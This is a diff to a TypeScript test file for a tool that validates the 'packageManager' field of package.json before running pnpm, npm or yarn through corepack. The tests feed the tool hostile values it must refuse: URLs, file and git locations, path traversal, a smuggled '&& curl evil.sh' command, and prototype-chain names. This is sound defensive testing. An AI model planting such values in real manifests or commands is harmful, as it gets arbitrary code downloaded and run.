@@ -1,11 +1,14 @@
 import { describe, expect, it } from "vitest";
 
+import { ALLOWED_EXECUTABLES } from "./exec.ts";
 import {
   type VerifyRequest,
   discoverPlan,
+  invocationOf,
   packageManagerOf,
   unverifiableChanges,
   verify,
+  versionNote,
 } from "./verify.ts";
 import type { CommandResult, CommandRunner } from "./worktree.ts";
 
@@ -62,18 +65,27 @@ function reason(result: { outcome: string; reason?: string }): string {
 }
 
 describe("packageManagerOf", () => {
-  it("reads the declared manager and drops the version", () => {
-    expect(packageManagerOf(MANIFEST)).toBe("pnpm");
-    expect(packageManagerOf(`{"packageManager":"yarn@4.1.0"}`)).toBe("yarn");
+  it("keeps the declared version rather than dropping it", () => {
+    expect(packageManagerOf(MANIFEST)).toEqual({ name: "pnpm", version: "11.20.0" });
+    expect(packageManagerOf(`{"packageManager":"yarn@4.1.0"}`)).toEqual({
+      name: "yarn",
+      version: "4.1.0",
+    });
   });
 
-  it("defaults when nothing is declared", () => {
-    expect(packageManagerOf(`{"scripts":{}}`)).toBe("pnpm");
+  it("defaults when nothing is declared, and says the version is unknown", () => {
+    // `null` and not a guessed version. The absence has to survive to the plan,
+    // because it is what `versionNote` reports and what makes an install
+    // refusal on a CI-green repository diagnosable.
+    expect(packageManagerOf(`{"scripts":{}}`)).toEqual({ name: "pnpm", version: null });
   });
 
   it("refuses a manager it was never given", () => {
-    expect(packageManagerOf(`{"packageManager":"bun@1"}`)).toBeNull();
-    expect(packageManagerOf(`{"packageManager":"../../evil@1"}`)).toBeNull();
+    // Valid semver throughout, so the *name* allowlist is the only thing that
+    // can reject these. With `1` as the version the version pattern would
+    // refuse them too and this test would pass with the allowlist unplugged.
+    expect(packageManagerOf(`{"packageManager":"bun@1.0.0"}`)).toBeNull();
+    expect(packageManagerOf(`{"packageManager":"../../evil@1.0.0"}`)).toBeNull();
     expect(packageManagerOf(`{"packageManager":42}`)).toBeNull();
   });
 
@@ -82,8 +94,86 @@ describe("packageManagerOf", () => {
     // `in` silently admits every name on Object.prototype — and this value
     // decides which binary gets executed.
     for (const inherited of ["constructor", "toString", "hasOwnProperty", "__proto__"]) {
-      expect(packageManagerOf(`{"packageManager":"${inherited}@1"}`)).toBeNull();
+      expect(packageManagerOf(`{"packageManager":"${inherited}@1.0.0"}`)).toBeNull();
     }
+  });
+
+  it("refuses anything corepack would treat as a location rather than a version", () => {
+    // The one that matters: corepack accepts a URL here and will download and
+    // execute it. The manifest belongs to the repository being verified, so
+    // this is the path from "a file in someone's repo" to "arbitrary code on
+    // this machine".
+    for (const hostile of [
+      "https://example.com/evil.tgz",
+      "file:///tmp/evil",
+      "git@github.com:evil/pnpm.git",
+      "../../../evil",
+      "9.15.9 && curl evil.sh",
+    ]) {
+      expect(packageManagerOf(`{"packageManager":"pnpm@${hostile}"}`)).toBeNull();
+    }
+  });
+
+  it("refuses a range or a dist-tag, because neither is reproducible", () => {
+    for (const loose of ["^9.0.0", "~9.1", "9", "9.x", "latest", "next", ""]) {
+      expect(packageManagerOf(`{"packageManager":"pnpm@${loose}"}`)).toBeNull();
+    }
+  });
+
+  it("accepts a prerelease and corepack's integrity suffix", () => {
+    expect(packageManagerOf(`{"packageManager":"pnpm@9.0.0-alpha.1"}`)).toEqual({
+      name: "pnpm",
+      version: "9.0.0-alpha.1",
+    });
+    expect(packageManagerOf(`{"packageManager":"pnpm@9.15.9+sha512.abc123"}`)).toEqual({
+      name: "pnpm",
+      version: "9.15.9+sha512.abc123",
+    });
+  });
+
+  it("refuses a second @ whichever half it lands in", () => {
+    // Note this does *not* prove the first-`@` split is load-bearing: with the
+    // name allowlist in place `lastIndexOf` refuses these too, because the
+    // disagreeing half always contains an `@` and no allowed name does. The
+    // split is a backstop and `verify.ts` says so. What this test does pin is
+    // that neither reading lets one through.
+    expect(packageManagerOf(`{"packageManager":"pnpm@9.15.9@https://evil"}`)).toBeNull();
+    expect(packageManagerOf(`{"packageManager":"pnpm@evil@9.15.9"}`)).toBeNull();
+    expect(packageManagerOf(`{"packageManager":"pnpm@@9.15.9"}`)).toBeNull();
+  });
+});
+
+describe("invocationOf", () => {
+  it("goes through corepack when a version is declared", () => {
+    expect(invocationOf({ name: "pnpm", version: "9.15.9" })).toEqual(["corepack", "pnpm@9.15.9"]);
+  });
+
+  it("falls back to the bare name on PATH when none is", () => {
+    expect(invocationOf({ name: "pnpm", version: null })).toEqual(["pnpm"]);
+  });
+
+  it("only ever names an executable the runner allows", () => {
+    // The two lists are coupled by nothing but this assertion: `exec.ts`
+    // refuses argv[0] outside its allowlist, so a plan built here that names
+    // something else would refuse at execution rather than at discovery.
+    for (const manager of ["pnpm", "npm", "yarn"]) {
+      for (const version of [null, "9.15.9"]) {
+        const argv0 = invocationOf({ name: manager, version })[0] ?? "";
+        expect(ALLOWED_EXECUTABLES).toContain(argv0);
+      }
+    }
+  });
+});
+
+describe("versionNote", () => {
+  it("names the declared toolchain", () => {
+    expect(versionNote({ name: "pnpm", version: "9.15.9" })).toContain("pnpm@9.15.9");
+  });
+
+  it("says PATH decided, and points at the mismatch, when nothing was pinned", () => {
+    const note = versionNote({ name: "pnpm", version: null });
+    expect(note).toContain("PATH");
+    expect(note).toContain("CI");
   });
 });
 
@@ -101,9 +191,9 @@ describe("discoverPlan", () => {
       "origin/main:package.json",
     ]);
     expect(result.outcome === "planned" ? result.plan.steps : []).toEqual([
-      { name: "typecheck", argv: ["pnpm", "run", "check-types"] },
-      { name: "lint", argv: ["pnpm", "run", "lint"] },
-      { name: "test", argv: ["pnpm", "run", "test"] },
+      { name: "typecheck", argv: ["corepack", "pnpm@11.20.0", "run", "check-types"] },
+      { name: "lint", argv: ["corepack", "pnpm@11.20.0", "run", "lint"] },
+      { name: "test", argv: ["corepack", "pnpm@11.20.0", "run", "test"] },
     ]);
   });
 
@@ -113,7 +203,8 @@ describe("discoverPlan", () => {
     // A run that edited the lockfile fails install rather than resolving to
     // whatever it asked for.
     expect(result.outcome === "planned" ? result.plan.install : []).toEqual([
-      "pnpm",
+      "corepack",
+      "pnpm@11.20.0",
       "install",
       "--frozen-lockfile",
     ]);
@@ -133,6 +224,7 @@ describe("discoverPlan", () => {
 
     const result = await discoverPlan(runner, request());
 
+    // Bare `pnpm`, not corepack: this fixture pins no `packageManager`.
     expect(result.outcome === "planned" ? result.plan.steps[0] : null).toEqual({
       name: "typecheck",
       argv: ["pnpm", "run", "typecheck"],
@@ -242,10 +334,10 @@ describe("verify", () => {
     expect(runner.calls.map((argv) => argv.join(" "))).toEqual([
       "git -C /tmp/solve/SSX-3822 diff --name-only -z origin/main --",
       "git -C /repos/advisor show origin/main:package.json",
-      "pnpm install --frozen-lockfile",
-      "pnpm run check-types",
-      "pnpm run lint",
-      "pnpm run test",
+      "corepack pnpm@11.20.0 install --frozen-lockfile",
+      "corepack pnpm@11.20.0 run check-types",
+      "corepack pnpm@11.20.0 run lint",
+      "corepack pnpm@11.20.0 run test",
     ]);
   });
 
@@ -295,7 +387,9 @@ describe("verify", () => {
 
     await verify(runner, request());
 
-    expect(runner.calls.map((argv) => argv.join(" "))).not.toContain("pnpm run test");
+    expect(runner.calls.map((argv) => argv.join(" "))).not.toContain(
+      "corepack pnpm@11.20.0 run test",
+    );
   });
 
   it("counts a timed-out step as failed, never as inconclusive", async () => {
@@ -326,7 +420,7 @@ describe("verify", () => {
 
     expect(result.outcome).toBe("refused");
     expect(runner.calls.map((argv) => argv.join(" "))).not.toContain(
-      "pnpm install --frozen-lockfile",
+      "corepack pnpm@11.20.0 install --frozen-lockfile",
     );
   });
 
